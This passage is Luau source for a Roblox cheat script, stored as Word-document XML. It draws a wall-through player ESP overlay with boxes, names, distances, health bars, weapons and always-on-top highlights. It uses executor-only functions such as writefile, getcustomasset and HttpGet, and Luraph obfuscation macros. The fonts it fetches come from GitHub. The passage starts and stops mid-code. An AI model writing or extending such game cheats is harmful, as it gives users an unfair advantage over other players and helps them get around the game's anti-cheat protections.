        <w:t xml:space="preserve">                {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    weight = Weight,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    style = Style,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    assetId = getcustomasset(library.directory.."/assets/"..Asset.Id),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        writefile(library.directory.."/fonts/"..Name .. ".font", Services.HttpService:JSONEncode(Data))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return getcustomasset(library.directory.."/fonts/"..Name .. ".font");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Tahoma = RegisterFont("Tahoma", 400, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Id = "Tahoma.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Font = game:HttpGet("https://github.com/KingVonOBlockJoyce/OctoHook-UI/raw/refs/heads/main/fs-tahoma-8px%20(3).ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Pixel = RegisterFont("Pixel", 400, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Id = "Pixel.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Font = game:HttpGet("https://github.com/KingVonOBlockJoyce/vaderpaste.luau/raw/refs/heads/main/Pixel.ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Minecraftia = RegisterFont("Minecraftia", 400, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Id = "Minecraftia.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Font = game:HttpGet("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Minecraftia-Regular.ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    }) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Verdana = RegisterFont("Verdana", 400, "Normal", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Id = "Verdana.ttf",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Font = game:HttpGet("https://github.com/i77lhm/storage/raw/refs/heads/main/fonts/Verdana-Font.ttf"),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    })</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Fonts["Plex"] = Font.new(Tahoma, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Fonts["Pixel"] = Font.new(Pixel, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Fonts["Minecraftia"] = Font.new(Minecraftia, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Fonts["Verdana"] = Font.new(Verdana, Enum.FontWeight.Regular, Enum.FontStyle.Normal);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Players_ESP = {}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local RefreshAllElements = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for i,v in Players_ESP do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if v and v.RefreshElements then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            v.RefreshElements()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Workspace, RunService, Players, CoreGui = Services.Workspace, Services.RunService, Services.Players, Services.CoreGui</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    -- Def &amp; Vars</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Euphoria = Config.ESP.Connections;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local lplayer = Players.LocalPlayer;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Cam = Workspace.CurrentCamera;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local RotationAngle, Tick = -45, tick();</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Functions = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        function Functions:Create(Class, Properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local _Instance = typeof(Class) == 'string' and Instance.new(Class) or Class</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            for Property, Value in pairs(Properties) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                _Instance[Property] = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return _Instance;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Functions.FadeOutOnDist = LPH_NO_VIRTUALIZE(function(element, distance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local transparency = math.max(0.1, 1 - (distance / Config.ESP.MaxDistance))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if element:IsA("TextLabel") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                element.TextTransparency = 1 - transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            elseif element:IsA("ImageLabel") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                element.ImageTransparency = 1 - transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            elseif element:IsA("UIStroke") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                element.Transparency = 1 - transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            elseif element:IsA("Frame") and (element == Healthbar or element == BehindHealthbar) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                element.BackgroundTransparency = 1 - transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            elseif element:IsA("Frame") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                element.BackgroundTransparency = 1 - transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            elseif element:IsA("Highlight") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                element.FillTransparency = 1 - transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                element.OutlineTransparency = 1 - transparency</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end);  </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Functions.AddOutline = LPH_NO_VIRTUALIZE(function(Frame, Thickness)     </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Functions:Create("Frame", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = Frame,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderSizePixel = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = Color3.new(0, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Position = UDim2.new(0, -Thickness, 0, -Thickness),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = UDim2.new(1, Thickness * 2, 0, Thickness),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndex = Frame.ZIndex - 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Functions:Create("Frame", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = Frame,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderSizePixel = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = Color3.new(0, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Position = UDim2.new(0, -Thickness, 1, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = UDim2.new(1, Thickness * 2, 0, Thickness),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndex = Frame.ZIndex - 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Functions:Create("Frame", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = Frame,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderSizePixel = 0,</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = Color3.new(0, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Position = UDim2.new(0, -Thickness, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = UDim2.new(0, Thickness, 1, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndex = Frame.ZIndex - 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Functions:Create("Frame", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Parent = Frame,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BorderSizePixel = 0,</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                BackgroundColor3 = Color3.new(0, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Position = UDim2.new(1, 0, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = UDim2.new(0, Thickness, 1, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ZIndex = Frame.ZIndex - 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    do -- Initalize</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ScreenGui = Functions:Create("ScreenGui", {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Parent = CoreGui,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Name = "ESPHolder",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ResetOnSpawn = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        });</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local DupeCheck = LPH_NO_VIRTUALIZE(function(plr)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if ScreenGui:FindFirstChild(plr.Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                ScreenGui[plr.Name]:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local getHealthColor = LPH_NO_VIRTUALIZE(function(currentHealth, maxHealth)    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return Config.ESP.Drawing.Healthbar.GradientRGB1:Lerp(Config.ESP.Drawing.Healthbar.GradientRGB2, (currentHealth / maxHealth))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local ESP = function(plr)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if plr == lplayer then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            coroutine.wrap(DupeCheck)(plr)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Name = Functions:Create("TextLabel", {Visible = false,Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, -11), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = Config.ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0), RichText = true})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Distance = Functions:Create("TextLabel", {Visible = false,Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, 11), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = Config.ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0), RichText = true})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Weapon = Functions:Create("TextLabel", {Visible = false,Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, 31), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = Config.ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0), RichText = true, Text = "None"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Box = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0.75, BorderSizePixel = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Gradient1 = Functions:Create("UIGradient", {Parent = Box, Enabled = Config.ESP.Drawing.Boxes.GradientFill, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Config.ESP.Drawing.Boxes.GradientFillRGB1), ColorSequenceKeypoint.new(1, Config.ESP.Drawing.Boxes.GradientFillRGB2)}})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Outline = Functions:Create("UIStroke", {Parent = Box, Enabled = Config.ESP.Drawing.Boxes.Gradient, Transparency = 0, Color = Color3.fromRGB(255, 255, 255), LineJoinMode = Enum.LineJoinMode.Miter})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Gradient2 = Functions:Create("UIGradient", {Parent = Outline, Enabled = Config.ESP.Drawing.Boxes.Gradient, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Config.ESP.Drawing.Boxes.GradientRGB1), ColorSequenceKeypoint.new(1, Config.ESP.Drawing.Boxes.GradientRGB2)}})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Healthbar = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local BehindHealthbar = Functions:Create("Frame", {BorderColor3 = Color3.fromRGB(0, 0, 0), Parent = ScreenGui, ZIndex = -1, BackgroundColor3 = Color3.fromRGB(0, 0, 0), BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local HealthbarGradient = Functions:Create("UIGradient", {Parent = Healthbar, Enabled = Config.ESP.Drawing.Healthbar.Gradient, Rotation = -90, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Config.ESP.Drawing.Healthbar.GradientRGB1), ColorSequenceKeypoint.new(1, Config.ESP.Drawing.Healthbar.GradientRGB2)}})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local HealthText = Functions:Create("TextLabel", {Visible = false,Parent = ScreenGui, Position = UDim2.new(0.5, 0, 0, 31), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = Config.ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0), ZIndex = 500})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Chams = Functions:Create("Highlight", {Parent = ScreenGui, FillTransparency = 1, OutlineTransparency = 0, OutlineColor = Color3.fromRGB(119, 120, 255), DepthMode = "AlwaysOnTop"})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local WeaponIcon = Functions:Create("ImageLabel", {Parent = ScreenGui, BackgroundTransparency = 1, BorderColor3 = Color3.fromRGB(0, 0, 0), BorderSizePixel = 0, Size = UDim2.new(0, 40, 0, 40)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Gradient3 = Functions:Create("UIGradient", {Parent = WeaponIcon, Rotation = -90, Enabled = Config.ESP.Drawing.Weapons.Gradient, Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Config.ESP.Drawing.Weapons.GradientRGB1), ColorSequenceKeypoint.new(1, Config.ESP.Drawing.Weapons.GradientRGB2)}})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local LeftTop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LeftSide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RightTop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RightSide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BottomSide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BottomDown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BottomRightSide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BottomRightDown = Functions:Create("Frame", {Parent = ScreenGui, BackgroundColor3 = Config.ESP.Drawing.Boxes.Corner.RGB, Position = UDim2.new(0, 0, 0, 0), BorderSizePixel = 0, BorderColor3 = Color3.new(0,0,0)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Flag1 = Functions:Create("TextLabel", {Visible = false,Parent = ScreenGui, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = Config.ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Flag2 = Functions:Create("TextLabel", {Visible = false,Parent = ScreenGui, Position = UDim2.new(1, 0, 0, 0), Size = UDim2.new(0, 100, 0, 20), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = Config.ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --local DroppedItems = Functions:Create("TextLabel", {Visible = false,Parent = ScreenGui, AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, TextColor3 = Color3.fromRGB(255, 255, 255), Font = Enum.Font.Code, TextSize = Config.ESP.FontSize, TextStrokeTransparency = 0, TextStrokeColor3 = Color3.fromRGB(0, 0, 0)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Functions.AddOutline(LeftTop, 1); Functions.AddOutline(LeftSide, 1); Functions.AddOutline(LeftSide, 1); Functions.AddOutline(RightTop, 1); Functions.AddOutline(RightSide, 1); Functions.AddOutline(BottomSide, 1); Functions.AddOutline(BottomDown, 1); Functions.AddOutline(BottomRightSide, 1); Functions.AddOutline(BottomRightDown, 1); </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not plr.Character then plr.CharacterAdded:Wait() end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Humanoid, HRP = plr.Character:WaitForChild("Humanoid"), plr.Character:WaitForChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Pos, OnScreen = Cam:WorldToScreenPoint(HRP.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Dist = (Cam.CFrame.Position - HRP.Position).Magnitude</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Size = HRP.Size.Y</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if DefaultPlayerSettings[plr.Name] and DefaultPlayerSettings[plr.Name].RootSettings and DefaultPlayerSettings[plr.Name].RootSettings.Size then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Size = DefaultPlayerSettings[plr.Name].RootSettings.Size.Y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local health_clamped = math.clamp(Humanoid.Health, 0, Humanoid.MaxHealth)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local health = health_clamped / Humanoid.MaxHealth;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local scaleFactor = (Size * Cam.ViewportSize.Y) / (Pos.Z * 2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local w, h = 3 * scaleFactor, 4.5 * scaleFactor</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if not Players_ESP[plr.Name] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- ERROR BECAUSE LEAVE + JOIN NEW PLAYER CHARACTER NEW ESP ELEMTNS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name] = {}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Players_ESP[plr.Name].RefreshElements = LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.ESP.Font == Fonts["Plex"] or Config.ESP.Font == Fonts["Pixel"] or Config.ESP.Font == Fonts["Minecraftia"] or Config.ESP.Font == Fonts["Verdana"] then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            HealthText.FontFace = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name.FontFace = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Distance.FontFace = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Weapon.FontFace = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            HealthText.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Name.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Distance.Font = Config.ESP.Font</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
